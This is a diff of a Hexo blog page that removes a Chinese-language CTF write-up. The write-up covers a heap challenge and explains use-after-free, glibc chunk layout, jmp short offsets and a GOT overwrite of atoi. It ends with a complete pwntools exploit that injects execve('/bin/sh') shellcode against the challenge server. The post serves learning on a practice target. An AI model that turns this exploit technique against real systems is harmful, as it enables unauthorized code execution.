-                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>6.5k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>6 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>我学习pwn已经有一段时间了，遇到了一个有意思的题目，再此分析一下</p>
-<p>题目链接： <a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=1&amp;id=4611&amp;page=1">题目 (xctf.org.cn)</a> </p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638852309396.png" class width="1638852309396">         
-<p><strong>选项一</strong>可以申请一片内存空间，位置和大小都可以自己定义（空间大小不超过8字节），并且有一次写入的机会，<strong>选项四</strong>可以释放某片内存空间，本程序中没有<strong>BackDoor</strong></p>
-<p>当我第一次分析这个题时，而一眼就注意到了<strong>UAF</strong>漏洞，没有<strong>BackDoor</strong>，并且没有开<strong>NX</strong>，由此可以判断：本程序<strong>需要在堆中写入shellcode来获取权限</strong></p>
-<hr>
-<p><strong>UAF（Use After Free）</strong></p>
-<p>如果程序利用“free”，“delete”等函数释放内存时没有置空指针，就会造成UAF漏洞</p>
-<p>先看一段代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a;</span><br><span class="line">    a = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);<span class="comment">//申请a</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;ywhkkx&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//释放a</span></span><br><span class="line">    <span class="keyword">char</span> *b;</span><br><span class="line">    b = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);<span class="comment">//申请相同大小的b</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;isacaib&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b addr:%x,%s\n&quot;</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>输出结果：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a addr:6792d2a0,ywhkkx</span><br><span class="line">b addr:6792d2a0,isacaib</span><br><span class="line">a addr:6792d2a0,isacaib</span><br></pre></td></tr></table></figure>
-<p>申请“a”后，释放“a”，然后申请相同大小的“b”</p>
-<p>根据结果来看，“a”和“b”两个指针指向了同一片内存空间，修改“b”，“a”也发生改变</p>
-<p>根本原因：</p>
-<p>这里涉及到 <strong>ptmaoolc</strong> 的知识了（一种heap管理算法）：</p>
-<p>ptmalloc是glibc默认的内存管理器 </p>
-<p>在ptmalloc内部，内存块采用<strong>chunk</strong>管理，并且将大小相似的chunk用链表管理，一个链表被称为一个bin。前64个bin里，相邻的bin内的chunk大小相差8字节，称为<strong>small bin</strong>，后面的是<strong>large bin</strong>，large bin里的chunk按先大小，再最近使用的顺序排列，每次分配都找一个最小的能够使用的chunk </p>
-<p><strong>PS：</strong>ptmaoolc算法的行为肯定有利于CPU的运算，具体就不展开了（我也不会）</p>
-<p>这里挂两个博客，讲的更详细：</p>
-<p>UAF：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/73612451">https://blog.csdn.net/qq_31481187/article/details/73612451</a></p>
-<p>ptmaoolc： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/biterror/p/6913236.html">ptmalloc总结 - bitError - 博客园 (cnblogs.com)</a> </p>
-<p>这里还有一个内存分配策略的总结：</p>
-<p> <a target="_blank" rel="noopener" href="https://owent.net/2013/867.html">ptmalloc,tcmalloc和jemalloc内存分配策略研究|I’m OWenT</a> </p>
-<hr>
-<p>本程序可以无限循环，也就是有多次写入的机会，但是仔细分析代码又会出现问题：</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638853489982.png" class width="1638853489982"> 
-<p>一次申请的空间大小不超过8字节，肯定装不下shellcode，所以要多次申请，并把shellcode分段装入这些堆内存空间中</p>
-<p>构造如下shellcode：（涉及到64位系统的传参约定）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,xxxx;/<span class="built_in">bin</span>/sh <span class="comment">#字符串的地址</span></span><br><span class="line">mov rax,<span class="number">59</span>; <span class="comment">#execve 的系统调用号</span></span><br><span class="line">mov rsi,<span class="number">0</span>;</span><br><span class="line">mov rdx,<span class="number">0</span>;</span><br><span class="line">syscall</span><br><span class="line">----------------------------</span><br><span class="line">execve(<span class="string">&#x27;/bin/sh&#x27;</span>,null,null)</span><br></pre></td></tr></table></figure>
-<p>构造shellcode片段：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codex=asm(<span class="string">&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;</span>)		<span class="comment">#把‘/bin/sh’装入rdi</span></span><br><span class="line">code0=asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)		<span class="comment">#清空rax</span></span><br><span class="line">code1=asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)		<span class="comment">#eax就是rax的低位</span></span><br><span class="line">code2=asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)		<span class="comment">#清空rsi（第2个参数）</span></span><br><span class="line">code3=asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)		<span class="comment">#清空rdx（第3个参数）</span></span><br><span class="line">code4=asm(<span class="string">&#x27;syscall&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>问题：可以发现“codex”的大小明显超过了8字节，这里先放一放</p>
-<p>现在需要程序按照这个顺序执行shellcode，但堆与堆之间没有联系，需要用jmp连接</p>
-<hr>
-<p><strong>IP控制指令：jmp short</strong></p>
-<p>jmp short 目标地址，占用2字节，可以按照相对位置进行寻址跳转</p>
-<p>机器码：EB + <strong>8位位移</strong></p>
-<p>计算公式：相对偏移地址 = 目标地址 - 当前地址 - 2（为什么要“-2”，后续进行分析）</p>
-<p>​        //当前地址：jmp指令的地址</p>
-<p>要理解这个计算公式首先得搞明白<strong>CPU执行指令的过程</strong>：</p>
-<p>1.从CS:IP指向的“内存单元”读取指令，送入指令缓存器</p>
-<p>2.（IP）=（IP）+ 所读取指令的长度，从而指向下一条指令</p>
-<p>3.执行指令，回到“1”，重复这个过程</p>
-<p>案例（“《汇编语言》-王爽 ” 中的例子）：</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638855433626.png" class width="1638855433626">   
-<img src="/2021/12/07/%E5%A0%86-UAF/1638855418915.png" class width="1638855418915"> 
-<p>可以发现“jmp short s”和机器码为<strong>EB03</strong>，而jmp自己的地址为<strong>0003</strong></p>
-<p>1.CS:IP指向“0003”（EB 03）</p>
-<p>2.指令“EB 03”被送入指令缓存器</p>
-<p>3.（IP）=（IP）+ 2 = 0005H ，CS:IP 指向 add ax,1</p>
-<p>4.CPU执行指令缓存器中的指令“EB 03”</p>
-<p>5.指令执行后，（IP）= 0008H ，CS:IP 指向 inc ax</p>
-<p>可以发现，指令“EB 03”执行以后，CS:IP立马完成了跳转，IP的变化为“0005H&gt;&gt;&gt;00008H”（<strong>差3</strong>）</p>
-<p>所以jmp中的目的地址是<strong>计算</strong>出来的：指令执行前IP的指向 + EB后的数值</p>
-<p>​        //因为是先进行<strong>2</strong>然后再进行<strong>4</strong>，所以计算公式中的“-2”就是减去“jmp short s”指令的长度</p>
-<hr>
-<p>那么EB后面的<strong>8位位移</strong>该写多少呢？</p>
-<p>这里需要先有<strong>64位堆结构</strong>和<strong>内存对齐</strong>的知识</p>
-<hr>
-<p><strong>完全二叉树特点</strong></p>
-<p>1.叶子结点只可能在最大两层出现</p>
-<p>2.对于任意一结点，如果其<strong>右子树</strong>的最大层次为L，则其<strong>左子树</strong>的最大层次为L+1</p>
-<p>​        //子树左对齐，不管右子树的有无，左子树一定存在（叶子结点除外）</p>
-<p>3.度为1的结点只有0或1个</p>
-<p>简而言之，完全二叉数就是一个“顺序填充”的过程：</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638682361768.png" class width="1638682361768"> 
-<p>数据会从左往右依次填充，直到某一层填满然后填下一层</p>
-<p><strong>64位堆结构</strong></p>
-<p>堆总是一棵完全二叉树 </p>
-<p>linux的堆内存管理分为三个层次，分别为<strong>分配区area</strong>、<strong>堆heap</strong>和<strong>内存块chunk</strong></p>
-<p>每次glibc分配的内存块称为chunk（函数“malloc”分配的内存）</p>
-<p>内存块 chunk ：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>prev_size：<strong>相邻的前一个堆块大小</strong>。这个字段只有在前一个堆块（且该堆块为<code>normal chunk</code>）处于<strong>释放状态</strong>时才有意义。这个字段最重要（甚至是唯一）的作用就是用于<strong>堆块释放时快速和相邻的前一个空闲堆块融合</strong>。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题</li>
-<li>size：本堆块的长度。长度计算方式：<strong>size字段长度+用户申请的长度+对齐</strong>。libc以 <strong>size_T 长度 * 2</strong> 为粒度对齐。例如 <strong>32bit</strong> 以 4 <em> 2= <strong>8byte</strong> 对齐，<strong>64bit</strong> 以 **8 </em> 2=0×10<strong> 对齐。因为最少以8字节对齐，所以size一定是8的倍数，</strong>故size字段的最后三位恒为0<strong>，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 </strong>当前堆块是否处于free状态的方法<strong> 就是 判断下一个堆块的 </strong>pre_inuse** 是否为 1 。这里也是 <code>double free</code> 和 <code>null byte offset</code> 等漏洞利用的关键</li>
-<li>fd&amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段<strong>只有在堆块free后</strong>才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。<strong>两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果</strong></li>
-<li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表</li>
-</ul>
-<p><strong>内存对齐</strong></p>
-<p>内存对齐和地址对齐一样，也是一种<strong>时空权衡</strong></p>
-<p>glibc的堆内存对齐机制：</p>
-<p>32位：<br>最少分配16字节堆，8字节对齐，每次增加8<br>其中4字节为头部，申请1-12堆，分配16字节堆</p>
-<p>64位：<br>最少分配32字节堆，16字节对齐，每次增加16<br>其中8字节为头部，申请1-24堆，分配32字节堆</p>
-<p>​        //16个字节头部，包括为数据区的 prev_size</p>
-<p>可以参考一下链接：</p>
-<p>堆利用： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9416792.html#:~:text=prev_size%20%EF%BC%9A%20%E7%9B%B8%E9%82%BB%E7%9A%84%E5%89%8D%E4%B8%80%E4%B8%AA%E5%A0%86%E5%9D%97%E5%A4%A7%E5%B0%8F%20%E3%80%82%20%E8%BF%99%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%8F%AA%E6%9C%89%E5%9C%A8%E5%89%8D%E4%">pwn with glibc heap（堆利用手册） - hac425 - 博客园 (cnblogs.com)</a></p>
-<hr>
-<p>64位程序一次性分配的最小堆字节为32</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638865453036.png" class width="1638865453036"> 
-<p>而静态数组“2020A0[v1]”的类型为“qword”（4字，32字节），刚好等于申请堆空间的最小值</p>
-<p>所以只要“v1”是连续的，那么申请出来的堆空间就是连续的</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638785857155.png" class width="1638785857155"> 
-<p>在内存块的结构中：<strong>fd&amp;bk</strong>作为数据区，shellcode和jmp都要写在这里</p>
-<p>执行jmp后程序需要跳转到下一个<strong>fd&amp;bk</strong>（数据区）</p>
-<p>计算：EB <strong>8位位移</strong> =  2 + 1 + 8 + 8 + 8 - 2 = 25（0x19） </p>
-<p>根据程序输入函数的算法，<strong>最后1字节</strong>的数据会被强行改为“0”，所以后面8字节的空数据不能使用</p>
-<p>所以真正可以利用的空间就只有<strong>7字节</strong>，除去<strong>2字节</strong>的jmp，就只剩下<strong>5字节</strong>了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codex=(asm(<span class="string">&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;</span>+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)<span class="comment">#明显超范围了</span></span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)<span class="comment">#左填充“\x90”保证7字节（右对齐）</span></span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))<span class="comment">#用ljust进行右填充（左对齐）</span></span><br></pre></td></tr></table></figure>
-<p>​        //这里在“jmp short”处选择右对齐，是为了防止“\x90\x90”干扰<strong>8位位移</strong>的计算</p>
-<p>分析到这里就只剩下两个问题了：</p>
-<p>1.<strong>codex</strong>超过了<strong>7字节</strong>，会导致execve的第一个参数无效（“/bin/sh”）</p>
-<p>2.shellcode没有办法执行</p>
-<p>堆不像栈，没有类似于<strong>“ret”</strong>这样的IP控制指令，想要执行堆中的shellcode片段，必须要<strong>CS:IP</strong>指针访问这一片堆空间才行，本程序中的shellcode片段已经用jmp进行了连接，所以只要<strong>CS:IP</strong>指针访问了<strong>codex</strong>，就等同于执行了shellcode</p>
-<p>那么有没有一个办法可以一次性解决这两个问题呢？</p>
-<p>仔细分析程序的代码，还可以发现一个漏洞：</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638867769887.png" class width="1638867769887"> 
-<p>“index”由用户输入并且没有检查其范围，之后就直接作为了静态数组“2020A0”的下标</p>
-<p>这就构成了<strong>数组越位漏洞</strong></p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638870007955.png" class width="1638870007955">
-<p><br> <img src="/2021/12/07/%E5%A0%86-UAF/1638870031044.png" class width="1638870031044"> </p>
-<p>静态数组“2020A0”的上方就是<strong>GOT表</strong>地址，这里的任何一个函数都可以被<strong>数组越位</strong>覆盖</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638871063099.png" class width="1638871063099"> 
-<p>而且在<strong>plt表</strong>中已经控制了<strong>CS:IP</strong>，所以再此之后覆盖的堆内存会被当做指令</p>
-<p>这里选择“atoi”是最正确的：</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638870249285.png" class width="1638870249285"> 
-<p><br></p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638870283436.png" class width="1638870283436"> 
-<p>分析代码就可以知道，“atoi”的参数是“read”读取来的，此处读入“/bin/sh”就可以代替<strong>codex</strong>了</p>
-<img src="/2021/12/07/%E5%A0%86-UAF/1638870472468.png" class width="1638870472468"> 
-<p>偏移计算为：（0x2020A0 - 0x202060）/ 8 = [-8]</p>
-<p>因为改变“atoi”会导致循环中断，所以 <strong>[-8]</strong> 的堆空间只能在最后申请，但它又必须第一个执行</p>
-<p>这里就需要利用<strong>UAF</strong>使  [0]（第一次申请的空间）和 [-8] 指向同一片内存（“atoi”的GOT表）</p>
-<p>具体exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53787</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,code0)</span><br><span class="line">malloc(<span class="number">1</span>,code1)</span><br><span class="line">malloc(<span class="number">2</span>,code2)</span><br><span class="line">malloc(<span class="number">3</span>,code3)</span><br><span class="line">malloc(<span class="number">4</span>,code4)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(-<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span>
+    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -3213,7 +3138,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">270</span>
+          <span class="site-state-item-count">271</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -3262,12 +3187,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">3.6m</span>
+    <span title="Symbols count total">3.7m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">55:10</span>
+    <span title="Reading time total">55:20</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
